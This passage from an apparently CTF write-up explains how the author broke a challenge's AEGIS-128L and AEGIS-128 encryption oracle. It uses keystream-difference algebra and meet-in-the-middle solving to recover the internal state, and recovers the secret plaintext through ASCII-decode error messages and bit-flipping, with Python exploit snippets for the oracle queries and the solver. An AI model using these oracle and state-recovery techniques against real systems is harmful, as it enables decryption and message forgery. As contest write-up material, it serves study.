&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;What does this imply? Knowing that $s^{(1)}_{2,j} = s^{(2)}_{2,j}$ for $j = 2, 3, 6, 7$. Let&#39;s look closely on the last 32 bytes of the keystream:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{aligned}
k^{(1)}_{20} \oplus k^{(2)}_{20}
&amp;= m^{(1)}_{20} \oplus c^{(1)}_{20} \oplus m^{(2)}_{20} \oplus c^{(2)}_{20} \\
&amp;= \left[ (s^{(1)}_{22} \wedge s^{(1)}_{23}) \oplus s^{(1)}_{21} \oplus s^{(1)}_{26} \right] \oplus \left[ (s^{(2)}_{22} \wedge s^{(2)}_{23}) \oplus s^{(2)}_{21} \oplus s^{(2)}_{26} \right] \\
&amp;= s^{(1)}_{21} \oplus s^{(2)}_{21}.
\end{aligned}
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;And similarly $k^{(1)}_{21} \oplus k^{(2)}_{21} = s^{(1)}_{25} \oplus s^{(2)}_{25}$.&lt;/p&gt;

&lt;p&gt;Why is it useful? Let&#39;s define a new function, &lt;code&gt;p&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;(s: block) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; block:
  t0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;]])
  t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]])
  t2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]])
  t3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;]])
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; _block_from_ints([t0, t1, t2, t3])&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Déjà vu? It is more or less the same with &lt;code&gt;AESEnc&lt;/code&gt;. We can state that &lt;code&gt;AESEnc(s, t) == p(s) ^ t&lt;/code&gt; too. Looking even more closely, one could observe that the first four bytes from &lt;code&gt;p&lt;/code&gt; solely depends on bytes 0, 5, 10 and 15 from &lt;code&gt;s&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Knowing this, we can further expand $k^{(1)}_{20} \oplus k^{(2)}_{20}$:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{aligned}
k^{(1)}_{20} \oplus k^{(2)}_{20}
&amp;= s^{(1)}_{21} \oplus s^{(2)}_{21} \\
&amp;= \text{AESEnc}(s^{(1)}_{10}, s^{(1)}_{11}) \oplus \text{AESEnc}(s^{(2)}_{10}, s^{(2)}_{11}) \\
&amp;= p(s^{(1)}_{10}) \oplus s^{(1)}_{11} \oplus p(s^{(2)}_{10}) \oplus s^{(2)}_{11} \\
&amp;= p(s^{(1)}_{10}) \oplus p(s^{(2)}_{10}) \\
&amp;= p\left(\text{AESEnc}(s^{(1)}_{07}, s^{(1)}_{00}) \oplus m^{(1)}_{00}\right) \oplus p\left(\text{AESEnc}(s^{(2)}_{07}, s^{(2)}_{00}) \oplus m^{(2)}_{00}\right) \\
&amp;= p(x \oplus m^{(1)}_{00}) \oplus p(x \oplus m^{(2)}_{00}).
\end{aligned}\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;(We define $x := \text{AESEnc}(s_{07}, s_{00}) = s_{10} \oplus m^{(1)}_{00}$ for ease of reading.)&lt;/p&gt;

&lt;p&gt;And now the &lt;em&gt;only&lt;/em&gt; unknown is $x$. Can we solve it easily? Yes indeed: we can compute bytes 0, 5, 10, 15 of $x$ from the first four bytes of $k^{(1)}_{20} \oplus k^{(2)}_{20}$. Along with three more equalities from &lt;code&gt;p&lt;/code&gt;, we are able to recover $x$ completely. I used an meet-in-the-middle approach to solve for $x$ in five seconds.&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-08-25-googlectf/hm.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;But wait. There is a problem: I am able to find 65536 candidates (or even more) instead of 1, but I am &lt;em&gt;unable&lt;/em&gt; to eliminate the rest. The possible number of states will be growing exponentally! What can I do? The solution is actually simple: Just send $M^{(3)}$ and compute another solution set of $x$. After all, it is very likely that $x$ is the only element in the intersection of the two sets. With $x$, we are able to compute $s_{10}$ (respectively $s_{14}$).&lt;/p&gt;

&lt;h3 id=&#34;part-iii-finishing-the-first-part-of-the-challenge&#34;&gt;Part III: Finishing the first part of the challenge&lt;/h3&gt;

&lt;p&gt;We can extend the above idea to leak more. By sending two 128-byte messages with blocks 3 and 4 being different, we are able to recover $s_{20}$ and $s_{24}$. We are able to leak $s_{30}$ and $s_{34}$ with the same idea.&lt;/p&gt;

&lt;p&gt;Two more questions remain: How is it made possible in seven queries? And more importantly, how can we recover $s_{ij}$ for all $j$, for some $i$ (preferably $i = 0\ \text{or}\ 1$)?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Challenge 1.&lt;/strong&gt; Recover the above states in 7 queries.&lt;/p&gt;

&lt;p&gt;In short, we are encrypting these seven plaintexts (each &lt;code&gt;0&lt;/code&gt; represents 16 &lt;code&gt;\x00&lt;/code&gt;&#39;s, etc):&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;0000000000&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0000110000&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0000220000&lt;/code&gt; - Derive $s_{10}$ and $s_{14}$ uniquely with (1) and (2)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0000001100&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0000002200&lt;/code&gt; - Derive $s_{20}$ and $s_{24}$ uniquely with (1) and (4)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0000000011&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0000000022&lt;/code&gt; - Derive $s_{30}$ and $s_{34}$ uniquely with (1) and (6)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Challenge 2.&lt;/strong&gt; Recover $s_{1, j}$ for all $j$.&lt;/p&gt;

&lt;p&gt;From above, we are able to derive $s_{i, 0}$ and $s_{i, 4}$ for $i = 1, 2, 3$ with $m_{ij} = 0$. Hence, the state transition would be $s_{i+1, j} \leftarrow p(s_{i, j-1}) \oplus s_{ij}$ for all $i, j$. Equivalently $s_{i, j-1} = p^{-1}(s_{i+1, j} \oplus s_{ij})$.&lt;/p&gt;

&lt;p&gt;We are able to compute inverses of $p^{-1}$ easily. Solving system of linear equations would be all good, but I&#39;m doing it with meet-in-the-middle. Code reuse for the win! For now, let&#39;s visualize how $s_{1, j}$&#39;s can be derived.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  rankdir=BT
  s₁₀[fillcolor=yellow,style=filled]
  s₁₄[fillcolor=yellow,style=filled]
  s₂₀[fillcolor=yellow,style=filled]
  s₂₄[fillcolor=yellow,style=filled]
  s₃₀[fillcolor=yellow,style=filled]
  s₃₄[fillcolor=yellow,style=filled]
  
  s₂₀ -&amp;gt; s₂₇
  s₃₀ -&amp;gt; s₂₇
  
  s₂₄ -&amp;gt; s₂₃
  s₃₄ -&amp;gt; s₂₃
  
  s₁₄ -&amp;gt; s₁₃
  s₂₄ -&amp;gt; s₁₃
  
  s₁₃ -&amp;gt; s₁₂
  s₂₃ -&amp;gt; s₁₂
  
  s₁₀ -&amp;gt; s₁₇
  s₂₀ -&amp;gt; s₁₇
  
  s₁₇ -&amp;gt; s₁₆
  s₂₇ -&amp;gt; s₁₆
  
  s₁₂ -&amp;gt; s₁₁
  s₁₃ -&amp;gt; s₁₁
  s₁₆ -&amp;gt; s₁₁
  
  s₁₆ -&amp;gt; s₁₅
  s₁₇ -&amp;gt; s₁₅
  s₁₂ -&amp;gt; s₁₅  
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After all, the first part of the challenge is done.&lt;/p&gt;

&lt;h3 id=&#34;part-iv-aegis128-vs-aegis128l&#34;&gt;Part IV: AEGIS-128 vs AEGIS-128L&lt;/h3&gt;

&lt;p&gt;For the second part, AEGIS-128 is used. The state is now 80 bytes (five 16-byte blocks). The payload size has been reduced to one block (let&#39;s denote it by $m$). This is how the state transited:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_{i+1, 0} \leftarrow p(s_{i, 4}) \oplus s_{i, 0} \oplus m$, and&lt;/li&gt;
&lt;li&gt;$s_{i+1, j} \leftarrow p(s_{i, j-1}) \oplus s_{i, j}$ for $1 \leq j \leq 4$.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Moreover, the keystream $k_i$ for the $i$-th round is also altered: $k_i = (s_{i, 2} \wedge s_{i, 3}) \oplus s_{i, 1} \oplus s_{i, 4}$.&lt;/p&gt;

&lt;h3 id=&#34;part-v-exploring-the-challenge&#34;&gt;Part V: Exploring the challenge&lt;/h3&gt;

&lt;p&gt;I have no idea what&#39;s going on, so I decided to recover the printable &lt;code&gt;secret_plaintext&lt;/code&gt; first.&lt;/p&gt;

&lt;p&gt;It is pretty easy, and is made possible because we are able to receive the error from the oracle. In particular, from &lt;code&gt;pt.decode(&amp;quot;ascii&amp;quot;)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We are able to recover the plaintext with bit-flipping. To begin with, we can flip the whole ciphertext by &lt;code&gt;\x80&lt;/code&gt;. The first 32 bytes for the plaintext would be flipped by &lt;code&gt;\x80&lt;/code&gt; as well. If we send the flipped ciphertext (denote by $c_?$) to the oracle, we will obtain:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UnicodeDecodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xe7 in position 0: ordinal not in range(128)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This means that the first byte of the &lt;em&gt;flipped&lt;/em&gt; plaintext would be &lt;code&gt;\xe7&lt;/code&gt;. Hence, the first byte of the plaintext is &lt;code&gt;\x67&lt;/code&gt; (&lt;code&gt;g&lt;/code&gt;). We then flip the first byte of $c_?$ by &lt;code&gt;\x80&lt;/code&gt; and send it to the oracle, we will be receiving another error:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UnicodeDecodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xc6 in position 1: ordinal not in range(128)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This recovers the second byte - &lt;code&gt;x46&lt;/code&gt; (&lt;code&gt;F&lt;/code&gt;). Since the secret plaintext is 96-byte long, we can recover it with 96 oracle calls.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;REMAINING ORACLE CALLS: 231 - 96 = 135.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With a plaintext recovered, it is time for us to try to recover the internal state. Can we devise a similar strategy that is similar to the first part of the challenge? Formally, what will happen if we have two 48-byte messages $M^{(1)} := (m^{(1)}_0, m^{(1)}_1, m^{(1)}_2)$ and $M^{(2)} := (m^{(2)}_0, m^{(2)}_1, m^{(2)}_2)$ with only the first block being different. Then the last 16 bytes in the keystream will be:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{aligned}
k^{(1)}_2 \oplus k^{(2)}_2
&amp;= \left[ (s^{(1)}_{22} \wedge s^{(1)}_{23}) \oplus s^{(1)}_{21} \oplus s^{(1)}_{24} \right] \oplus \left[ (s^{(2)}_{22} \wedge s^{(2)}_{23}) \oplus s^{(2)}_{21} \oplus s^{(2)}_{24} \right] \\
&amp;= s^{(1)}_{21} \oplus s^{(2)}_{21} \\
&amp;= p(s^{(1)}_{10}) \oplus s^{(1)}_{11} \oplus p(s^{(2)}_{10}) \oplus s^{(2)}_{11} \\
&amp;= p(s^{(1)}_{10}) \oplus p(s^{(2)}_{10}) \\
&amp;= p\left(\text{AESEnc}(s^{(1)}_{04}, s^{(1)}_{00}) \oplus m^{(1)}_1\right) \oplus p\left(\text{AESEnc}(s^{(2)}_{04}, s^{(2)}_{00}) \oplus m^{(2)}_1\right) \\
&amp;= p(x \oplus m^{(1)}_0) \oplus p(x \oplus m^{(2)}_0).
\end{aligned}
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Hereby denote $x := \text{AESEnc}(s_{04}, s_{00}) = s_{10} \oplus m^{(1)}_0$. Simply put, if we have the ciphertexts for $M^{(1)}$ and $M^{(2)}$ (denote it as $C^{(k)} = (c^{(k)}_0, c^{(k)}_1, c^{(k)}_2)$), we are able to recover one-fifths of the state if this happens.&lt;/p&gt;

&lt;p&gt;How are we able to do it? Well actually, we have recovered the secret plaintext above. We can flip the first block of the ciphertext arbitrarily (to $C_?$).&lt;/p&gt;

&lt;p&gt;However, since $k^{(2)}_2$ is altered, the third block of the message would be updated. Luckily we are able to recover the message in 17 oracle calls. Here&#39;s how:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Sends $C_?$. We will obtain something like this:
&lt;code&gt;UnicodeDecodeError: &#39;ascii&#39; codec can&#39;t decode byte 0xe8 in position 34...&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Flips the 35th byte by &lt;code&gt;\xe8&lt;/code&gt; in $C_?$. Sends the patched $C_?$:
&lt;code&gt;UnicodeDecodeError: &#39;ascii&#39; codec can&#39;t decode byte 0xcb in position 35...&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Flips the 36th byte by &lt;code&gt;\xcb&lt;/code&gt; in $C_?$. Repeat the process until we receive &lt;strong&gt;OK&lt;/strong&gt;, meaning that the plaintext is now ASCII-encoded.&lt;/li&gt;
&lt;li&gt;For now, we have recovered a subset of message bytes. We then flip the unknown bytes by &lt;code&gt;\x80&lt;/code&gt; (for example, bytes 33 and 34) to throw errors from the oracle.&lt;/li&gt;
&lt;li&gt;Repeat step 1 until all unknown bytes are recovered.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In short, we spent 16 oracle calls to recover the message, and one oracle call to indicate us to flip all the bytes those were originally printable. We are then able to recover a possible set of $s_{10}$ with 65536 entries (or more). We can spend another 17 queries to find the actual $s_{10}$, however.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;REMAINING ORACLE CALLS: 135 - 17&amp;times;2 = 101.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With the same idea, we can recover $s_{20}, s_{30}, s_{40}$ with 17&amp;times;6 queries. This would allow us to recover $s_{10}, s_{11}, ..., s_{14}$ and hence forging arbitrary messages (along with a slightly longer AD).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;REMAINING ORACLE CALLS: 101 - 17&amp;times;6 = -1.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Shoot - we are one query short. Since we are able to recover one byte of the plaintext in each of the queries, so it doesn&#39;t hurt to sacrifice one oracle calls by guessing one byte. So... in theory, we are able to finish the challenge with once every 256 times.&lt;/p&gt;

&lt;p&gt;Luckily, if we are given a incorrect plaintext (actually keystream), we are unable to recover a single $s_*$. That&#39;s pretty good, we are able to solve the challenge every time.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;REMAINING ORACLE CALLS: -1 + 1 = :tada:.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;With the exploit script written, I am able to reach the very end locally. Congratulations to me!&lt;/p&gt;

&lt;h3 id=&#34;part-iv-wait-arent-we-done&#34;&gt;Part IV: Wait... Aren&#39;t we done?&lt;/h3&gt;

&lt;p&gt;No... When I am interacting to the server, I am &lt;em&gt;always&lt;/em&gt; disconnected while sending one of the 231 oracle calls. Asking the organizers in IRC, knowing that there was an 1-minute timeout - it was later increased to 10 minutes. Unfortunately, my solution runs for around 5 minutes. I have two choices:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Wait until the challenge has a 10-minute timeout, or&lt;/li&gt;
&lt;li&gt;Optimize the script and have it completed in one minute.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Seeing that there are already few teams solving the challenge, I think (2) would be fun.&lt;/p&gt;

&lt;h4 id=&#34;61-reducing-online-complexity&#34;&gt;6.1. Reducing online complexity&lt;/h4&gt;

&lt;p&gt;For inputs that does not require immediate feedbacks, we can send them at the same time. This is an example when I am recovering &lt;code&gt;secret_plaintext&lt;/code&gt; in the second part.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Before optimization&lt;/span&gt;
test_ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes([c&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ciphertext])
m0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(test_ciphertext))
    test_ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cxor(test_ciphertext, i, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
    p, mc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; try_decrypt_read(r)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; i
    m0 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; bytes([mc&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;])

&lt;span style=&#34;color:#75715e&#34;&gt;# After optimization&lt;/span&gt;
test_ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes([c&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ciphertext])
m0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(test_ciphertext))
    test_ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cxor(test_ciphertext, i, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;):
    p, mc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; try_decrypt_read(r)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; i
    m0 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; bytes([mc&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;])&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&#34;62-reducing-offline-complexity&#34;&gt;6.2. Reducing offline complexity&lt;/h4&gt;

&lt;p&gt;For example, this is the method I implemented to solve for $x$ from $p(x \oplus a) \oplus p(x \oplus b) = c$ - it takes one second each time:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;px_subsolve&lt;/span&gt;(a_sub, b_sub, c_sub):
    &lt;span style=&#34;color:#75715e&#34;&gt;# Given a_sub, b_sub, c_sub (4 bytes), find x_sub such that&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]]&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]]&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# = c_sub&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;# Reformulating:&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ te0[(x_sub ^ a_sub)[0]] ^ te1[(x_sub ^ a_sub)[1]] ^ c_sub&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# = te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]] ^ te2[(x_sub ^ a_sub)[2]] ^ te3[(x_sub ^ a_sub)[3]]&lt;/span&gt;
    lhss &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x0, x1 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; itertools&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;product(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;), repeat&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        &lt;span style=&#34;color:#75715e&#34;&gt;# LHS&lt;/span&gt;
        xs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [be0[x0&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;a_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]], be0[x0&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;b_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]], be1[x1&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;a_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]], be1[x1&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;b_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]], c_sub]
        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; reduce(_xor, xs)
        lhss[y] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lhss&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(y, []) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [(x0, x1)]
        
    solns &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x2, x3 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; itertools&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;product(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;), repeat&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        &lt;span style=&#34;color:#75715e&#34;&gt;# RHS&lt;/span&gt;
        xs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [be2[x2&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;a_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]], be2[x2&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;b_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]], be3[x3&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;a_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]], be3[x3&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;b_sub[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]]]
